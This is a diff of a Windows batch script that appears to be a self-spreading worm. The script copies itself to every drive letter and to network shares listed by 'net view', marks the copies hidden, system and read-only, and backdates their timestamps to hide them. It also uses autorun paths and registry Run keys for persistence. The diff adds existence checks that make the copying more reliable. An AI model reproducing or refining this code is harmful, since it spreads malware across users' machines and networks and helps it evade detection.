@@ -96,6 +96,7 @@ attrib +h +r +s "%path_autoRun1%\%~nx0"
 attrib +h +r +s "%path_autoRun2%\%~nx0"
 
 
+
 for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do (
   if exist "%%i:\" (
     if exist "%%i:\%~nx0" (
@@ -131,14 +132,19 @@ for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do (
       )
     ) else (
       copy /y "%~dpnx0" %%i:\
-      attrib -h -r -s "%%i:\%~nx0"
-      %module_fileTouch% /w /a /c /d 09-11-2001 /t 22:59:59 "%%i:\%~nx0"
-      attrib +h +r +s "%%i:\%~nx0"
+
+      if exist "%%i:\%~nx0" (
+        attrib -h -r -s "%%i:\%~nx0"
+        %module_fileTouch% /w /a /c /d 09-11-2001 /t 22:59:59 "%%i:\%~nx0"
+        attrib +h +r +s "%%i:\%~nx0"
+      )
     )
   )
 )
 
 timeout /nobreak /t 5 >nul
+
+
 
 for /f "skip=3 tokens=1,* delims= " %%i in ('net view') do if /i "%%i" NEQ "The" (
   for /f "skip=7 tokens=1,* delims= " %%j in ('net view %%i') do if /i "%%j" NEQ "The" (
@@ -164,9 +170,12 @@ for /f "skip=3 tokens=1,* delims= " %%i in ('net view') do if /i "%%i" NEQ "The"
       )
     ) else (
       copy /y "%~dpnx0" "%%i\%%j\"
-      attrib -h -r -s "%%i\%%j\%~nx0"
-      %module_fileTouch% /w /a /c /d 09-11-2001 /t 22:59:59 "%%i\%%j\%~nx0"
-      attrib +h +r +s "%%i\%%j\%~nx0"
+
+      if exist "%%i\%%j\%~nx0" (
+        attrib -h -r -s "%%i\%%j\%~nx0"
+        %module_fileTouch% /w /a /c /d 09-11-2001 /t 22:59:59 "%%i\%%j\%~nx0"
+        attrib +h +r +s "%%i\%%j\%~nx0"
+      )
     )
   )
 )
@@ -187,6 +196,8 @@ taskkill /f /im "cmd.exe"
 del /q "%path_autoRun1%\%~nx0"
 del /q "%path_autoRun2%\%~nx0"
 
+
+
 for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do (
   del /q "%%i:\%~nx0"
   reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
@@ -205,6 +216,8 @@ for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do (
   )
 )
 
+
+
 for /f "skip=3 tokens=1,* delims= " %%i in ('net view') do if /i "%%i" NEQ "The" (
   for /f "skip=7 tokens=1,* delims= " %%j in ('net view %%i') do if /i "%%j" NEQ "The" (
     del /q "%%i\%%j\%~nx0"
@@ -220,4 +233,5 @@ for /f "skip=3 tokens=1,* delims= " %%i in ('net view') do if /i "%%i" NEQ "The"
     )
   )
 )
+
 exit
